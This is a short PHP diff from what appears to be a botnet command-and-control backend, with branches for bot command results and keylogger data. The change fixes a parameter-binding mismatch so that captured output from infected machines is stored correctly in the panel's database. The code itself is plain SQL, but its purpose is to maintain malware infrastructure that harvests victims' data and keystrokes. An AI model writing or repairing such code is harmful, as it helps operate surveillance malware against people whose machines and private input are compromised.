@@ -24,7 +24,7 @@ if ($table == "cmd") {
     $currentDateTimeStr = $currentDateTime->format('Y-m-d H:i:s');
     $query = "INSERT INTO capture (IdBot, CaptureResult) VALUES (?, ?)";
     $stmt = $db->prepare($query);
-    $stmt->bind_param('sss', $idbot, $content, $currentDateTimeStr);
+    $stmt->bind_param('ss', $idbot, $content);
     $stmt->execute();
 } else if ($table == "keylogger") {
     //detail: timeStart + ? + timeStop + ?
